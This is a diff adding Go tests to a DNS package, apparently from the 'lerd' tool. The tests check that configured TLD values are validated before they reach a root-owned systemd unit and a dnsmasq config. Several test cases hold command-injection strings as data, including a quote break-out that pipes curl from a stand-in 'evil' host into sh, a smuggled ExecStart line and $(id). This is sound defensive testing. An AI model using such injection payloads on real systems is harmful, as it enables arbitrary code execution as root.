@@ -3,6 +3,7 @@ package dns
 import (
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"testing"
 )
@@ -215,4 +216,105 @@ func TestConfiguredUpstreamDNS_emptyWhenUnset(t *testing.T) {
 	if got := configuredUpstreamDNS(); len(got) != 0 {
 		t.Errorf("expected no upstreams, got %v", got)
 	}
+}
+
+// The TLD is interpolated into the shell command of a root-owned systemd unit
+// that lerd writes and starts through its own passwordless sudo grants, so a
+// config.yaml carrying a crafted dns.tld would be arbitrary code as root. Nothing
+// that is not a DNS label may reach ConfiguredTLD's callers.
+func TestConfiguredTLD_rejectsAnythingThatIsNotADNSLabel(t *testing.T) {
+	for _, bad := range []string{
+		`test'; curl http://evil/x | sh; #`, // closes the ExecStart quote
+		"test\nExecStart=/bin/sh -c 'id'",   // injects a second unit directive
+		"$(id)", "`id`", "te st", "-lead", "trail-", "", "../../etc",
+		// Dots are allowed between labels, but never as a way to smuggle an
+		// empty, traversing or otherwise non-label segment past the check.
+		".", "..", "a..b", ".lead", "trail.", "a.-b", "a.b-", "a./b", "a.b/c",
+		"a.b c", "a.$(id)", "a.b\nExtra", strings.Repeat("a.", 127) + "toolong",
+	} {
+		if ValidTLD(bad) {
+			t.Errorf("ValidTLD accepted %q, which would reach a root shell", bad)
+		}
+	}
+	for _, good := range []string{
+		"test", "dev", "local8", "my-tld", "x",
+		// Multi-label suffixes are usable: the rest of lerd already appends
+		// dns.tld verbatim to build site domains, vhosts and certificate SANs.
+		"lerd.test", "lab.example.dev", "internal.example.com", "a.b.c.d.e",
+	} {
+		if !ValidTLD(good) {
+			t.Errorf("ValidTLD rejected the usable TLD %q", good)
+		}
+	}
+}
+
+// The bug behind #1544's DNS sidenote: a multi-label dns.tld was rejected by the
+// single-label check, so the writer emitted the default while every reader looked
+// for the configured value and the diagnostic could never pass.
+func TestWriteDnsmasqConfig_honoursMultiLabelTLD(t *testing.T) {
+	writeGlobalConfig(t, "dns:\n  enabled: true\n  tld: lab.example.dev\n")
+
+	dir := t.TempDir()
+	if err := WriteDnsmasqConfigFor(dir, "127.0.0.1"); err != nil {
+		t.Fatalf("WriteDnsmasqConfigFor: %v", err)
+	}
+	content := readGlobalFile(t, filepath.Join(dir, "lerd.conf"))
+
+	assertContains(t, content, "address=/.lab.example.dev/127.0.0.1")
+	if strings.Contains(content, "address=/.test/") {
+		t.Errorf("configured TLD was replaced by the default, got:\n%s", content)
+	}
+}
+
+// Writer and reader must derive the suffix from the same place: defaultDnsmasqConfigOK
+// looks for exactly this string, so a config the writer produced has to satisfy it.
+func TestConfiguredTLD_writerEmitsWhatTheDiagnosticLooksFor(t *testing.T) {
+	for _, tld := range []string{
+		"test",
+		"lerd.test",
+		"lab.example.dev",
+		`bad'; curl http://evil/x | sh; #`, // rejected, so both sides must see the default
+		"a..b",                             // rejected for an empty label
+	} {
+		t.Run(tld, func(t *testing.T) {
+			writeGlobalConfig(t, "dns:\n  enabled: true\n  tld: "+strconv.Quote(tld)+"\n")
+
+			dir := t.TempDir()
+			if err := WriteDnsmasqConfigFor(dir, "127.0.0.1"); err != nil {
+				t.Fatalf("WriteDnsmasqConfigFor: %v", err)
+			}
+			content := readGlobalFile(t, filepath.Join(dir, "lerd.conf"))
+
+			want := "address=/." + ConfiguredTLD() + "/"
+			if !strings.Contains(content, want) {
+				t.Errorf("diagnostic looks for %q, writer produced:\n%s", want, content)
+			}
+		})
+	}
+}
+
+// A rejected TLD falls back rather than reaching the dnsmasq config at all.
+func TestConfiguredTLD_rejectedSuffixNeverReachesTheConfig(t *testing.T) {
+	writeGlobalConfig(t, "dns:\n  enabled: true\n  tld: \"bad'; curl http://evil/x | sh; #\"\n")
+
+	dir := t.TempDir()
+	if err := WriteDnsmasqConfigFor(dir, "127.0.0.1"); err != nil {
+		t.Fatalf("WriteDnsmasqConfigFor: %v", err)
+	}
+	content := readGlobalFile(t, filepath.Join(dir, "lerd.conf"))
+
+	if strings.Contains(content, "evil") || strings.Contains(content, "curl") {
+		t.Errorf("payload reached the dnsmasq config:\n%s", content)
+	}
+	assertContains(t, content, "address=/."+DefaultTLD+"/")
+}
+
+// readGlobalFile mirrors readFile from setup_test.go, which is linux-only.
+func readGlobalFile(t *testing.T, path string) string {
+	t.Helper()
+	b, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatalf("reading %s: %v", path, err)
+	}
+	return string(b)
 }
